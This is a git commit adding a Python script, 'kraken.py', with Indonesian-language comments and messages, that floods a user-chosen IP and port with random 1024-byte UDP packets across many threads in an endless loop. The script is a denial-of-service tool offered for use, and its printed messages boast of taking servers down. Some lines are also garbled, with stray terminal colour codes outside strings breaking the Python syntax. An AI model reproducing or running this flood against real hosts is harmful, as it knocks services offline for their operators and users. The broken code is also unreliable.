25919e100abd867721a2dc2813d1e86cc2b81cf7
dita44 <83097973+dita44@users.noreply.github.com>
2022-02-26 12:18:14 +0800

    Add files via upload

---
+++ kraken.py
@@ -0,0 +1,35 @@
+#!/usr/bin/env python3
+#Yahahahahaha Hapus Credit/rename gw doain tobat lu
+#semoga harimu menyenangkan
+
+import random
+import socket
+import threading
+import os
+os.system("clear")
+33[31;1m print("AUTHOR : KRAKEN")
+print("CREDIT : KRAKEN")
+print("TEAM : KRAKEN")
+print("Rename terus ganti credit")
+print("Ama authornya gw incer lu")33[31;1m
+ip = str(input(" Ip/Hostnya : "))
+port = int(input(" Port Target : "))
+times = int(input(" Paket :"))
+threads = int(input(" Threads :"))
+
+def run():
+  data = random._urandom(1024)
+  i = random.choice(("[*]","[!]","[#]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(data,addr)
+      print(i +" Kraken Bergerak Menuju Masa Sukses")
+    except:
+      print("Server Dah Di Matiin Ama Kraken")
+
+for y in range(threads):
+    th = threading.Thread(target = run)
+    th.start()
